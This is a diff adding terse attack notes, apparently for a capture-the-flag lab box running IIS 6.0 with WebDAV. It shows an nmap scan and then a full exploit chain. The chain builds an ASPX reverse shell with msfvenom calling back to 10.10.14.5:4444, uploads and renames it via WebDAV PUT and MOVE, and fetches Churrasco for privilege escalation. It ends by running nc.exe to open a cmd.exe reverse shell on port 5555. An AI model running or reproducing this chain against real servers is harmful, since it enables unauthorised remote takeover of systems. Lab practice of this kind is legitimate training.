@@ -1,0 +1,39 @@
+─$ nmap -A 10.10.10.15 -p 1-65535             
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-28 20:48 CEST
+Nmap scan report for 10.10.10.15
+Host is up (0.030s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+|_http-server-header: Microsoft-IIS/6.0
+| http-webdav-scan: 
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+|   Server Type: Microsoft-IIS/6.0
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Date: Mon, 29 Jul 2024 10:56:15 GMT
+|_  WebDAV type: Unknown
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+|_http-title: Under Construction
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.5 LPORT=4444 -o shell.aspx 
+mv shell.aspx shell.txt
+
+curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
+curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt' 
+http://10.10.10.15/shell.aspx'
+
+
+https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
+curl -X PUT http://10.10.10.15/chrrasco.txt --data-binary @chrrasco.txt
+curl -X MOVE --header 'Destination:http://10.10.10.15/chrrasco.exe' 'http://10.10.10.15/chrrasco.txt' 
+
+curl -X PUT http://10.10.10.15/nc.txt --data-binary @nc.txt
+curl -X MOVE --header 'Destination:http://10.10.10.15/nc.exe' 'http://10.10.10.15/nc.txt' 
+
+chrrasco.exe -d "\inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.5 5555"
+
+
+
